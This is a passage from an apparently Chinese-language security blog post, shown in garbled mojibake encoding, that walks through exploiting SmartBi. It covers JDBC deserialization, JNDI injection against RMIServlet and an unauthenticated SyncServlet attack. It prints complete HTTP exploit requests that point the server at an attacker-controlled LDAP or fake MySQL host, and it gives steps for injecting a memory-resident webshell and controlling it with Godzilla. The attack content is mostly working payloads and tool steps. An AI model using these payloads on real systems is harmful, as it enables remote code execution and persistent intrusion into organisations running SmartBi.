<figure class="shiki Java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre><code>public void testConnection(IDataSource dataSource) {
       MetaDataServiceImpl.getInstance().testConnection(dataSource);
   }</code></pre></div></div></figure>
</li>
<li><p>æ­£å¸¸è°ƒâ½¤ä¼šâ¾›åˆ° MetaDataServiceImpl çš„ testConnection ä¸­ï¼Œæ‰§â¾è¯¥è¯­å¥ï¼ŒæœåŠ¡å™¨å°±ä¼šå‘è¿œ ç¨‹FakeMysqlå°è¯•è¿æ¥ï¼Œå°±ä¼šæ¥æ”¶åˆ°FakeMysqlè¿”å›çš„æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå°±ä¼šè§¦å‘æˆ‘ ä»¬æ‰€æ„é€ çš„payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173454054.png" srcset="/img/loading.gif" lazyload alt="image-20250812182609648"></p>
</li>
<li><p>è¦è°ƒâ½¤ DataSourceService çš„ testConnection â½…æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ &#x2F;vision&#x2F;RMIServle t çš„åå°„è°ƒâ½¤æŸç±»çš„æŸâ½…æ³•è¿›â¾è°ƒâ½¤ï¼Œæ„é€ payloadå¦‚ä¸‹ï¼ˆåœ¨POSTæ•°æ®åŒ…ä¸­ï¼Œéœ€è¦è¿›â¾â¼€æ¬¡URLç¼–ç ï¼Œ å¦åˆ™ä¼šæŠ¥é”™ï¼‰</p>
</li>
</ol>
<p>åœ¨è¿›â¾â½…æ³•è°ƒâ½¤æ—¶ï¼Œä¼šå°†æˆ‘ä»¬ä¼ â¼Šçš„å­—ç¬¦ä¸²ç±»å‹å‚æ•° params ï¼Œè½¬æ¢æˆâ¼€ä¸ªJsonArrayç±»å‹çš„å‚æ•°</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173457556.png" srcset="/img/loading.gif" lazyload alt="image-20250812182902720"></p>
<p>æ­¥â¼Š execute â½…æ³•ä¸­ï¼Œä»¥ä¸‹éƒ¨åˆ†ä»£ç ï¼Œå¯ä»¥å°†JSONå¯¹è±¡è½¬åŒ–æˆObjectå¯¹è±¡</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173458919.png" srcset="/img/loading.gif" lazyload alt="image-20250812182957914"></p>
<p>ç„¶åå°†var5å¯¹è±¡ä¼ â¼Š testConnection â½…æ³•ä¸­</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">testConnection</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">IDataSource</span><span style="color: #E06C75"> dataSource) {</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">MetaDataServiceImpl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">testConnection</span><span style="color: #ABB2BF">(dataSource);</span></span>
<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure>

<p>å†è¿›â¼€æ­¥ï¼Œä¼šå°†dataSourceä¸­å­˜å‚¨çš„ä¿¡æ¯â¼€â¼€æ‹¿å‡ºï¼Œâ½¤äºåç»­çš„æ•°æ®æºè¿æ¥</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">testConnection</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">IDataSource</span><span style="color: #E06C75"> dataSource) {</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">DataSource</span><span style="color: #E06C75"> ds </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">DataSource</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setId</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UUIDGenerator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">generate</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setName</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAlias</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getAlias</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDriver</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDriver</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDesc</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDesc</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDbCharset</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDbCharset</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setUrl</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getUrl</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setUser</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getUser</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDriverType</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDriverType</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setMaxConnection</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getMaxConnection</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setValidationQuery</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getValidationQuery</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setPassword</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPassword</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setTransactionIsolation</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getTransactionIsolation</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setValidationQueryMethod</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getValidationQueryMethod</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAuthenticationType</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getAuthenticationType</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPassword</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isNullOrEmpty</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getId</span><span style="color: #ABB2BF">())</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">DataSource</span><span style="color: #E06C75"> dbDs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FreeQueryDAOFactory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDataSourceDAO</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">load</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getId</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setPassword</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dbDs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPassword</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">       }</span></span></code></pre></div></div></figure>

<h4 id="å†…å­˜é©¬ï¼š"><a href="#å†…å­˜é©¬ï¼š" class="headerlink" title="å†…å­˜é©¬ï¼š"></a>å†…å­˜é©¬ï¼š</h4><ol>
<li><p>é…ç½®å¥½â¼¯å…·ç±»å‹ã€ä¸­é—´ä»¶ã€å†…å­˜â»¢ç±»å‹ã€å¯†ç ç­‰ä¿¡æ¯ï¼Œç‚¹å‡»â½£æˆclassâ½‚ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173501931.png" srcset="/img/loading.gif" lazyload alt="image-20250812183232630"></p>
</li>
<li><p>ä½¿â½¤javaChainsâ¼¯å…·è¿›â¾æ³¨â¼Šï¼Œé€‰æ‹©â¾ƒå®šä¹‰å­—èŠ‚ç ï¼Œå°†æˆ‘ä»¬â½£æˆçš„classâ½‚ä»¶ä¸Šä¼ ä¸Šå»</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173504653.png" srcset="/img/loading.gif" lazyload alt="image-20250812183305769"></p>
</li>
<li><p>â½¤æˆ‘ä»¬çš„Pocå°†å†…å­˜â»¢æ³¨â¼Šè¿›å»</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173506011.png" srcset="/img/loading.gif" lazyload alt="image-20250812183343304"></p>
</li>
<li><p>é…ç½®å“¥æ–¯æ‹‰å¯†ç å¯†é’¥ä¿¡æ¯ï¼ŒåŒæ—¶è®¾ç½®è¯·æ±‚é…ç½®ï¼ˆä¸å†…å­˜â»¢è®¾ç½®è¯·æ±‚å¤´â¼€æ ·ï¼‰</p>
<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173507432.png" srcset="/img/loading.gif" lazyload alt="image-20250812183359493" style="zoom:50%;" />

<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173509318.png" srcset="/img/loading.gif" lazyload alt="image-20250812183413264" style="zoom:50%;" />
</li>
<li><p>å¯ä»¥çœ‹åˆ°æˆåŠŸè¿æ¥å¹¶æ‰§â¾å‘½ä»¤</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173511109.png" srcset="/img/loading.gif" lazyload alt="image-20250812183434734"></p>
</li>
</ol>
<h2 id="SmartBi-JNDIæ³¨â¼Š"><a href="#SmartBi-JNDIæ³¨â¼Š" class="headerlink" title="SmartBi-JNDIæ³¨â¼Š"></a>SmartBi-JNDIæ³¨â¼Š</h2><h4 id="payloadï¼š-3"><a href="#payloadï¼š-3" class="headerlink" title="payloadï¼š"></a><strong>payloadï¼š</strong></h4><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/RMIServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span>
<span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">192.168</span><span style="color: #98C379">.1.8:18080</span></span>
<span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span>
<span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span><span style="color: #98C379">,zh-TW</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.7</span><span style="color: #98C379">,zh-HK</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.5</span><span style="color: #98C379">,en-US</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.3</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.2</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">br</span></span>
<span class="line"><span style="color: #61AFEF">If-Modified-Since:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span>
<span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">charset</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UTF-8</span></span>
<span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">483</span></span>
<span class="line"><span style="color: #61AFEF">Origin:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080</span></span>
<span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keep-alive</span></span>
<span class="line"><span style="color: #61AFEF">Referer:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080/smartbi/vision/index.jsp</span></span>
<span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">JSESSIONID=E5045F082547A15B8646D2E018EB591A</span></span>
<span class="line"><span style="color: #61AFEF">Priority:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">u=</span><span style="color: #D19A66">0</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">className</span><span style="color: #56B6C2">=</span><span style="color: #98C379">DataSourceService</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">methodName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">testConnection</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">params</span><span style="color: #56B6C2">=</span><span style="color: #98C379">[{&quot;password&quot;%</span></span>
<span class="line"><span style="color: #61AFEF">3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;maxConnection&quot;</span><span style="color: #61AFEF">%3a100,</span><span style="color: #61AFEF">&quot;user&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;driverType&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;MYSQL&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;validationQ</span></span>
<span class="line"><span style="color: #61AFEF">uery&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;SELECT+1+FROM+DUAL&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;url&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;JNDI:ldap://xxxx.xxx.xxx.xxx:50389/0</span></span>
<span class="line"><span style="color: #61AFEF">7e967&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;name&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;JDBC&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;driver&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;com.mysql.jdbc.Driver&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;id&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;des</span></span>
<span class="line"><span style="color: #61AFEF">c&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;alias&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;dbCharset&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;identifierQuoteString&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;</span><span style="color: #98C379">`</span><span style="color: #61AFEF">&quot;,&quot;trans</span></span>
<span class="line"><span style="color: #61AFEF">actionIsolation&quot;%3a-1,&quot;validationQueryMethod&quot;%3a0,&quot;dbToCharset&quot;%3a&quot;&quot;,&quot;auth</span></span>
<span class="line"><span style="color: #61AFEF">enticationType&quot;%3a&quot;STATIC&quot;}]</span></span></code></pre></div></div></figure>

<p>ä½¿â½¤JavaChainsâ½£æˆPayload</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173514363.png" srcset="/img/loading.gif" lazyload alt="image-20250812183630155"></p>
<p>å‘é€æ•°æ®åŒ…æˆåŠŸæ‰§â¾å‘½ä»¤ï¼Œå¼¹å‡ºè®¡ç®—å™¨</p>
<h4 id="æ¼æ´åˆ†æï¼š-3"><a href="#æ¼æ´åˆ†æï¼š-3" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a><strong>æ¼æ´åˆ†æï¼š</strong></h4><ol>
<li><p>æ¼æ´ç‚¹åŒä¸Š</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173600292.png" srcset="/img/loading.gif" lazyload alt="image-20250812183759234"></p>
</li>
<li><p>â¾›â¼Š ConnectionPool çš„ getConnection â½…æ³•â¾¥ï¼Œæœ‰è¿™ä¹ˆâ¼€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœè·å–çš„URLæ˜¯ä»¥ JDN I: å¼€å¤´ï¼Œå°±ä¼šå°† JNDI: æˆªå–ï¼Œå¯¹å‰©ä¸‹çš„éƒ¨åˆ†è°ƒâ½¤ lookup() </p>
<p><img src="C:\Users\95227\Desktop\image-20250812184549730.png" srcset="/img/loading.gif" lazyload alt="image-20250812184549730"></p>
</li>
<li><p>â½£æˆpayload JNDI:ldap:&#x2F;&#x2F;xxxx.xxx.xxx.xxx:50389&#x2F;07e967</p>
</li>
</ol>
<h4 id="å†…å­˜é©¬ï¼š-1"><a href="#å†…å­˜é©¬ï¼š-1" class="headerlink" title="å†…å­˜é©¬ï¼š"></a>å†…å­˜é©¬ï¼š</h4><ol>
<li><p>å†…å­˜â»¢å¯ä»¥ä½¿â½¤JavaChainsè¿›â¾æ³¨â¼Šï¼Œé€‰æ‹©è°ƒâ½¤Jmgâ½£æˆæ³¨â¼Šå†…å­˜â»¢</p>
<p>ï¼ˆé…ç½®å†…å­˜â»¢çš„â¼¯å…·ç§ç±»ã€å†…å­˜â»¢ç±»å‹ã€ä¸­é—´ä»¶ç±»å‹ç­‰ç­‰ï¼Œç„¶åç‚¹å‡»â½£æˆï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173517313.png" srcset="/img/loading.gif" lazyload alt="image-20250812184700407"></p>
</li>
<li><p>å‘é€Payloadè¿›â¾æ³¨â¼Šå†…å­˜â»¢</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173518704.png" srcset="/img/loading.gif" lazyload alt="image-20250812184730041"></p>
</li>
<li><p>æ‰“å¼€å“¥æ–¯æ‹‰ï¼Œé…ç½®â½¬æ ‡ä¿¡æ¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173520026.png" srcset="/img/loading.gif" lazyload alt="image-20250812184746918"></p>
</li>
<li><p>è®°ä½æ ¹æ®é…ç½®çš„è¯·æ±‚å¤´ï¼Œåœ¨å“¥æ–¯æ‹‰ä¸­è®¾ç½®è¯·æ±‚é…ç½®</p>
<p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250812184756424.png" srcset="/img/loading.gif" lazyload alt="image-20250812184756424"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173521845.png" srcset="/img/loading.gif" lazyload alt="image-20250812184804807"></p>
</li>
<li><p>å¯ä»¥çœ‹åˆ°å†…å­˜â»¢æ³¨â¼ŠæˆåŠŸï¼Œå¯ä»¥è¿æ¥å¹¶è¿›â¾å‘½ä»¤æ‰§â¾</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173527813.png" srcset="/img/loading.gif" lazyload alt="image-20250812184820515"></p>
</li>
</ol>
<h2 id="å‰å°JDBCååºåˆ—åŒ–"><a href="#å‰å°JDBCååºåˆ—åŒ–" class="headerlink" title="å‰å°JDBCååºåˆ—åŒ–"></a>å‰å°JDBCååºåˆ—åŒ–</h2><h4 id="payloadï¼š-4"><a href="#payloadï¼š-4" class="headerlink" title="payloadï¼š"></a><strong>payloadï¼š</strong></h4><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/SyncServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span>
<span class="line"><span style="color: #61AFEF">Host:127.0.0.1:18080</span></span>
<span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span>
<span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip</span></span>
<span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">139</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">type</span><span style="color: #56B6C2">=</span><span style="color: #98C379">sqldictsync</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">dbNameOnly</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">dbType</span><span style="color: #56B6C2">=</span><span style="color: #98C379">MYSQL</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">dbServer</span><span style="color: #56B6C2">=</span><span style="color: #98C379">xxx.xxx.xxx.xxx:330</span></span>
<span class="line"><span style="color: #61AFEF">8</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">dbName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">dec03db?detectCustomCollations=</span><span style="color: #D19A66">true</span><span style="color: #98C379">%26autoDeserialize=yes</span></span></code></pre></div></div></figure>

<p>é€šè¿‡JavaChainsèµ·â¼€ä¸ªfakeMysqlæœåŠ¡å™¨ï¼Œå‘é€Pocè®©smartBiæœåŠ¡å™¨è¿æ¥fakeMysqlï¼Œå³å¯è§¦å‘ååºåˆ— åŒ–æ¼æ´</p>
<p>ç›´æ¥å¼¹å‡ºè®¡ç®—å™¨</p>
<h4 id="æ¼æ´åˆ†æï¼š-4"><a href="#æ¼æ´åˆ†æï¼š-4" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a><strong>æ¼æ´åˆ†æï¼š</strong></h4><ol>
<li><p>æŸ¥çœ‹web.xmlâ½‚ä»¶ï¼Œ SyncServlet é…ç½®åˆ°äº† &#x2F;vision&#x2F;SyncServlet è·¯å¾„ä¸‹ï¼Œä¸”ç»è¿‡æŸ¥çœ‹ï¼Œå¹¶æ²¡ æœ‰é…ç½®æ£€æŸ¥æ˜¯å¦ç™»å½•çš„è¿‡æ»¤å™¨ï¼Œå› æ­¤è®¿é—®è¯¥è·¯å¾„ä¸éœ€è¦ç™»å½•</p>
